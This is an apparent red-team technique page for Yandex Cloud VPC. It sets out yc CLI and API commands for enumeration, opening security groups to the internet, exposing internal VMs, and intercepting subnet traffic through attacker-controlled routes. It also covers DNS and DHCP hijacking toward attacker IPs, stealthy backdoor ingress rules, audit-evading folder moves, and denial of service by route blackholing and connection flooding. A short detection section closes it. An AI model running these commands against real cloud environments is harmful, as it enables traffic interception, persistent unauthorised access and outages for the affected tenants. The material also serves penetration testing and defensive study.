# Yandex Cloud - VPC / Networking Techniques

## Service Overview

Yandex Virtual Private Cloud (VPC) provides isolated cloud networks, subnets, security groups, routing, NAT gateways, public IPs, and DNS. Cloud networks are isolated from each other — traffic between different networks requires public IPs or multi-interface bridge VMs. Security groups are the primary network access control mechanism and are **stateful** with IPv4 only.

**Key Concepts:**
- **Cloud Networks**: Isolated L2 networks at the folder level. Subnets within the same network can communicate freely
- **Security Groups**: Stateful firewall rules at the network level. Default SG allows **ALL traffic**
- **Routing**: Static routes with next-hop IPs or NAT gateways. Route priority: static route > public IP > NAT gateway > Cloud Interconnect
- **Public IPs**: One-to-one NAT mapping. Dynamic (released on stop) or static (persistent)
- **DNS**: Internal DNS at `x.x.x.2` per subnet. Private zones override public DNS
- **Reserved Addresses**: `x.x.x.1` (gateway), `x.x.x.2` (DNS) per subnet

---

## Enumeration

### Enumerate Networks and Subnets

```bash
# List all networks
yc vpc network list

# Get network details (reveals default_security_group_id)
yc vpc network get <network_name>

# List all subnets
yc vpc subnet list

# Get subnet details (CIDR, zone, route table, DHCP options)
yc vpc subnet get <subnet_name>

# List used addresses in a subnet (discovers VMs, K8s nodes, load balancers)
yc vpc subnet list-used-addresses --name <subnet_name>
```

### Enumerate Security Groups

```bash
# List all security groups in the folder
yc vpc security-group list

# Get detailed security group with all rules
yc vpc security-group get <sg_name_or_id>
```

### Enumerate Public IPs and NAT

```bash
# List all public IP addresses (static and dynamic)
yc vpc address list

# Get IP address details
yc vpc address get <address_name>

# List NAT gateways
yc vpc gateway list

# Get NAT gateway details
yc vpc gateway get <gateway_name>
```

### Enumerate Routing

```bash
# List route tables
yc vpc route-table list

# Get route table details (shows static routes and next-hops)
yc vpc route-table get <route_table_name>
```

### Enumerate Private Endpoints

```bash
# List private endpoints (service connections)
yc vpc private-endpoint list

# Get private endpoint details
yc vpc private-endpoint get <endpoint_id>
```

### API-Based Enumeration

```bash
# List networks
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://vpc.api.cloud.yandex.net/vpc/v1/networks?folderId=<folder_id>"

# List security groups with rules
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://vpc.api.cloud.yandex.net/vpc/v1/securityGroups?folderId=<folder_id>"

# List used addresses in a subnet
curl -s -H "Authorization: Bearer <IAM_TOKEN>" \
  "https://vpc.api.cloud.yandex.net/vpc/v1/subnets/<subnet_id>/addresses"
```

---

## Privilege Escalation

### Modify Security Groups to Open Access

With `vpc.securityGroups.admin` or `editor`, add rules to expose internal services:

```bash
# Add rule allowing all inbound traffic from the internet
yc vpc security-group update-rules <sg_id> \
  --add-rule "direction=ingress,port=0-65535,protocol=any,v4-cidrs=[0.0.0.0/0]"

# Add rule allowing SSH from anywhere
yc vpc security-group update-rules <sg_id> \
  --add-rule "direction=ingress,port=22,protocol=tcp,v4-cidrs=[0.0.0.0/0]"
```

**Rule changes take effect immediately** across all associated resources — no restart needed.

### Exploit Default Security Group

The default security group allows **ALL ingress and egress traffic**. Any resource without an explicitly assigned custom SG operates under this fully permissive default:

```bash
# Identify the default SG for a network
yc vpc network get <network_name> --format json | jq -r '.default_security_group_id'

# Check if a VM uses the default SG (no explicit SG = default applies)
yc compute instance get <vm_id> --format json | \
  jq '.network_interfaces[].security_group_ids'
```

### Assign Public IP to Internal VM

With `vpc.publicAdmin`, expose an internal-only VM to the internet:

```bash
yc compute instance add-one-to-one-nat \
  --id <vm_id> \
  --network-interface-index 0
```

---

## Lateral Movement

### Traffic Interception via Route Table Manipulation

With `vpc.privateAdmin`, redirect all subnet traffic through a controlled VM:

```bash
# Create a route table that sends all traffic through your VM
yc vpc route-table create \
  --name intercept-route \
  --network-id <network_id> \
  --route destination=0.0.0.0/0,next-hop=<attacker_vm_internal_ip>

# Associate the route table with the target subnet
yc vpc subnet update <subnet_id> --route-table-id <new_route_table_id>
```

**Effect**: All outbound traffic from VMs in the subnet flows through the attacker VM. Also **disables** direct public IP access for those VMs (static route takes priority over public IP NAT).

### DNS Hijacking via Private Zone

Creating a private DNS zone for a public domain overrides resolution for the entire VPC network:

```bash
# Create a private zone that overrides google.com for the VPC
yc dns zone create \
  --name hijack-zone \
  --zone "google.com." \
  --private-visibility network-ids=<network_id>

# Add records pointing to attacker infrastructure
yc dns zone add-records --name hijack-zone \
  --record "@ 300 A <attacker_ip>"
yc dns zone add-records --name hijack-zone \
  --record "* 300 A <attacker_ip>"
```

**Risk**: This makes the real domain **inaccessible** from within that VPC network. All traffic intended for the domain goes to the attacker.

### DNS/NTP Takeover via DHCP Options

With `vpc.privateAdmin`, modify subnet DHCP settings to redirect DNS:

```bash
yc vpc subnet update <subnet_id> \
  --domain-name-server <attacker_dns_ip> \
  --ntp-server <attacker_ntp_ip> \
  --domain-name "attacker.local"
```

**Note**: VMs must reboot or run `sudo netplan apply` for changes to take effect. Changing DNS may break access to managed database services.

### Cross-Network Pivoting via Multi-Interface VMs

VMs with multiple network interfaces can bridge isolated networks:

```bash
# Requires vpc.publicAdmin for EACH network
# The multi-interface VM acts as a bridge between otherwise isolated networks
```

### Subnet Address Discovery

Map all active hosts in a subnet:

```bash
yc vpc subnet list-used-addresses --name <subnet_name>
# Returns all IPs in use: VMs, K8s nodes, load balancers, managed DB instances
```

---

## Persistence

### Maintain Static Public IP

Reserve a static IP that persists across VM stops and resource changes:

```bash
yc vpc address create --external-ipv4 zone=ru-central1-a --name persistent-access
```

### Create Backdoor Security Group Rules

Add subtle ingress rules that blend in with legitimate traffic:

```bash
# Add rule allowing access from a specific attacker IP on a common port
yc vpc security-group update-rules <sg_id> \
  --add-rule "direction=ingress,port=443,protocol=tcp,v4-cidrs=[<attacker_ip>/32]"
```

### Route Table Persistence

Static routes persist until explicitly removed. A route directing traffic through an attacker VM survives VM restarts.

---

## Defense Evasion

### Exploit Security Group Union Behavior

When multiple SGs are assigned (up to 5), rules are **union-ed** — traffic matching ANY rule in ANY group is allowed. Adding a permissive SG alongside restrictive ones effectively bypasses restrictions:

```bash
# Create a permissive SG
yc vpc security-group create --name allow-all \
  --rule "direction=ingress,port=0-65535,protocol=any,v4-cidrs=[0.0.0.0/0]" \
  --rule "direction=egress,port=0-65535,protocol=any,v4-cidrs=[0.0.0.0/0]" \
  --network-id <network_id>

# Assign it alongside existing restrictive SGs on a VM
# (requires compute.editor to change VM security groups)
```

### Move Security Group Between Folders

Security groups can be moved to folders with different audit policies:

```bash
yc vpc security-group move <sg_id> --destination-folder-id <folder_id>
```

---

## Impact / Denial of Service

### Empty Security Group — Block All Traffic

Assigning an SG with zero rules blocks ALL traffic (implicit deny-all):

```bash
# Create an empty security group
yc vpc security-group create --name block-all --network-id <network_id>

# Assign it to a target VM (replaces existing SGs)
# This effectively network-isolates the VM
```

### Connection Table Exhaustion

Security groups have a **350,000 connection limit** per interface. Exceeding this silently drops new connections:

```bash
# Flood a target with connections to exhaust the table
# New legitimate connections will be silently dropped
```

### Route Blackholing

Point routes to unused internal IPs to blackhole traffic:

```bash
yc vpc route-table create \
  --name blackhole \
  --network-id <network_id> \
  --route destination=0.0.0.0/0,next-hop=10.0.0.254  # unused IP

yc vpc subnet update <subnet_id> --route-table-id <blackhole_rt_id>
```

### Disable Deletion Protection and Remove Resources

```bash
# Remove deletion protection from a static IP
yc vpc address update --deletion-protection=false <address_id>

# Then delete it
yc vpc address delete <address_id>
```

---

## Key Security Defaults

| Setting | Default | Risk |
|---|---|---|
| Default Security Group | **Allows ALL traffic** (ingress + egress) | Every resource without explicit SG is fully open |
| Security group on empty rules | **Blocks ALL traffic** | DoS if empty SG assigned |
| SG rule changes | **Immediate** effect | No confirmation or delay |
| TCP idle timeout | **180 seconds** | Long-lived connections broken |
| Connection limit | **350,000** per interface | Silent drops beyond limit |
| Private DNS zones | **Override** public DNS | Full DNS hijack within VPC |
| Port 25 outbound | **Blocked** by Yandex Cloud | SMTP egress filtered |

---

## Key IAM Roles

| Role | What it Enables |
|---|---|
| `vpc.viewer` / `vpc.auditor` | View all VPC resources |
| `vpc.user` | Use networks, subnets, addresses, route tables, SGs |
| `vpc.privateAdmin` | Create/modify/delete networks, subnets, route tables, DHCP options |
| `vpc.publicAdmin` | Create/modify/delete public IPs, NAT gateways, multi-interface VMs |
| `vpc.securityGroups.admin` | Create/modify/delete security groups and rules |
| `vpc.securityGroups.user` | Assign SGs to network interfaces |
| `vpc.bridgeAdmin` | Manage cross-network connectivity |
| `vpc.gateways.editor` | Create/modify/delete NAT gateways |
| `vpc.gateways.user` | Connect NAT gateways to route tables |
| `vpc.privateEndpoints.editor` | Create/modify/delete private endpoints |
| `vpc.admin` | Full VPC admin (privateAdmin + publicAdmin + securityGroups.admin) |

**Note**: `vpc.admin` alone is NOT sufficient to create NAT gateways — requires `vpc.gateways.editor`.

---

## Detection and Logging

### Audit Trail Events

- `CreateSecurityGroup` / `DeleteSecurityGroup` — SG lifecycle
- `UpdateSecurityGroupRules` — rule changes (immediate effect)
- `CreateSubnet` / `UpdateSubnet` — subnet and DHCP changes
- `CreateRouteTable` / `UpdateRouteTable` — routing changes
- `CreateAddress` / `DeleteAddress` — public IP management
- `MoveSecurityGroup` / `MoveNetwork` — resource folder moves
- `CreateGateway` — NAT gateway creation

### Key Detection Opportunities

- SG rule additions allowing `0.0.0.0/0` ingress — over-permissive rules
- Route table changes with suspicious next-hops — traffic interception
- DHCP option modifications — DNS/NTP hijacking
- Private DNS zone creation for public domains — DNS override attacks
- Public IP assignment to previously internal VMs — exposure of internal services

---

## References

- VPC Documentation: `en/vpc/`
- Security Groups: `en/vpc/concepts/security-groups.md`
- Routing: `en/vpc/concepts/routing.md`
- DNS Zones: `en/dns/concepts/dns-zone.md`
- IAM Roles: `en/vpc/security/index.md`
- DDoS Protection: `en/vpc/ddos-protection/index.md`
